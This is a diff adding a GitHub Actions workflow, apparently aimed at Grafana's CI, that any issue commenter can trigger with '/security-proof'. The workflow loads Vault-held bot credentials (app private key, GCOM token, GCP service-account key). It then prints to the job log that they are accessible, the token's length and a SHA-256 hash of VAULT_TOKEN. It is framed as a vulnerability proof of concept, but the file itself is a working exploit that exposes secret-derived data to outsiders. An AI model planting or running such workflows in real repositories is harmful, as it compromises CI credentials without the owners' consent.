@@ -1,0 +1,40 @@
+name: Security Vulnerability Proof
+on:
+  issue_comment:
+    types: [created]
+
+jobs:
+  security-proof:
+    if: contains(github.event.comment.body, '/security-proof')
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get vault secrets (Same as original workflow)
+        uses: hashicorp/vault-action@v2
+        with:
+          # Secrets placed in ci/repo/grafana/grafana/
+          repo_secrets: |
+            APP_ID=ephemeral-instances-bot:app-id
+            APP_PEM=ephemeral-instances-bot:app-private-key
+            GCOM_HOST=ephemeral-instances-bot:gcom-host
+            GCOM_TOKEN=ephemeral-instances-bot:gcom-token
+            REGISTRY=ephemeral-instances-bot:registry
+            GCP_SA_ACCOUNT_KEY_BASE64=ephemeral-instances-bot:sa-key
+          # ... (konfigurasi yang sama)
+      
+      - name: 🔍 PROOF OF CONCEPT - Secret Access Evidence
+        run: |
+          echo "=== SECURITY VULNERABILITY DEMONSTRATION ==="
+          echo "This proves external contributors can access vault secrets"
+          echo ""
+          echo "Triggered by: ${{ github.actor }} (external contributor)"
+          echo "Comment author association: ${{ github.event.comment.author_association }}"
+          echo ""
+          echo "=== SECRETS ACCESSIBLE ==="
+          echo "VAULT_TOKEN: ${VAULT_TOKEN:+ACCESSIBLE} (${#VAULT_TOKEN} chars)"
+          echo "APP_PEM: ${APP_PEM:+ACCESSIBLE}"
+          echo "GCOM_TOKEN: ${GCOM_TOKEN:+ACCESSIBLE}"
+          echo ""
+          echo "=== HASH PROOF (No actual values exposed) ==="
+          echo "VAULT_TOKEN hash: $(echo $VAULT_TOKEN | sha256sum | cut -d' ' -f1)"
+          echo ""
+          echo "This demonstrates the security flaw without exposing actual values"
